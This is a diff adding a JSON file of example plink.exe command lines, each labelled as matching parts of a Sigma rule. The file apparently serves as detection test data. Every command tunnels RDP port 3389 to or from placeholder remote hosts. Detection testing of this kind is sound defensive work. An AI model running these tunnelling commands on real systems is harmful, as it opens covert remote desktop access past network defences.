@@ -1,0 +1,34 @@
+[
+  {
+    "output": "C:\\Windows\\Temp\\ot_plink.exe -R 3389:localhost:3389 -P 443 tunnel.com",
+    "explanation": "This command is a direct match for the Sigma rule's selection_a criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 443 flag."
+  },
+  {
+    "output": "plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 8080 rdp-tunnel-vps.com",
+    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 8080 flag."
+  },
+  {
+    "output": "plink.exe -L 3390:127.0.0.2:3389 -P 443 remoteserver.com",
+    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 443 flag."
+  },
+  {
+    "output": "plink.exe -R 3389:localhost:3389 -P 443 tunnel.com",
+    "explanation": "This command is a direct match for the Sigma rule's selection_a criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 443 flag."
+  },
+  {
+    "output": "plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 443 rdp-tunnel-vps.com",
+    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 443 flag."
+  },
+  {
+    "output": "plink.exe -L 3390:127.0.0.2:3389 -P 22 remoteserver.com",
+    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 22 flag."
+  },
+  {
+    "output": "plink.exe -R 3389:localhost:3389 -P 22 tunnel.com",
+    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 22 flag."
+  },
+  {
+    "output": "plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 22 rdp-tunnel-vps.com",
+    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 22 flag."
+  }
+]
